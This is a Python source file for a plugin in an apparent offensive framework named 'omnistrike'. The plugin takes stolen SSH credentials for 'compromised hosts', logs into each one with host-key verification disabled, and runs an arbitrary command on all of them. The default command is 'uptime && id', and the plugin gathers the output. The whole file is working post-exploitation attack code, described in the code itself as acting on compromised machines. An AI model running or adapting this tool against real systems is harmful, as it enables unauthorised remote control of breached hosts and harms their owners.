import asyncio
import asyncssh
from omnistrike.plugins.base import BasePlugin

class RemoteExecutionPlugin(BasePlugin):
    def __init__(self):
        self.proxy_manager = None
        # Default command to run
        self.default_command = "uptime && id"

    @property
    def name(self):
        return "RemoteExecution"

    @property
    def description(self):
        return "Executes arbitrary commands across all successfully compromised hosts."

    async def run(self, target, data):
        compromised_hosts = data.get('compromised_hosts', {})
        if not compromised_hosts:
            return

        command = data.get('exec_command', self.default_command)
        print(f"[*] Executing remote command on {len(compromised_hosts)} host(s): {command}")
        execution_results = {}

        for ip, creds in compromised_hosts.items():
            for cred in creds:
                if cred['service'] == 'ssh':
                    try:
                        async with asyncssh.connect(ip, username=cred['username'], password=cred['password'], known_hosts=None) as conn:
                            result = await conn.run(command)
                            output = result.stdout.strip() or result.stderr.strip()
                            print(f"[*] Results from {ip}:\n{output}")
                            execution_results[ip] = output
                            break
                    except Exception as e:
                        print(f"[!] Execution failed on {ip}: {e}")

        data['execution_results'] = execution_results
